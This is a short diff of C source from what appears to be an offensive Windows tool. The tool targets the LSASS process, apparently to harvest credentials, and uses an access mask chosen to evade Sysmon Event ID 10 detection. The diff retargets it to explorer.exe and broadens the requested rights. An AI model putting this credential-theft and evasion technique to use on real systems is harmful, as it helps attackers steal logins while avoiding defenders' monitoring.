@@ -190,7 +190,7 @@ BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo)
 int main()
 {
 	//We are after lsass
-	LPCWSTR lpwProcName = L"lsass.exe";
+	LPCWSTR lpwProcName = L"explorer.exe";
 
 	//Are we on a 64 bit OS
 	if (sizeof(LPVOID) != 8)
@@ -268,7 +268,8 @@ int main()
 	uPid.UniqueThread = (HANDLE)0;
 
 	// A deviation from the default access right mask to avoid standard Sysmon ID_10 detection - this can be changed to suit one's needs
-	ULONG rights = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
+	//ULONG rights = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
+	ULONG rights = (GENERIC_ALL|STANDARD_RIGHTS_ALL|DELETE);
 	printf("Access rights %x\n", rights);
 
 	const wchar_t* FunctionZWOpen = L"ZwOpenProcess10";
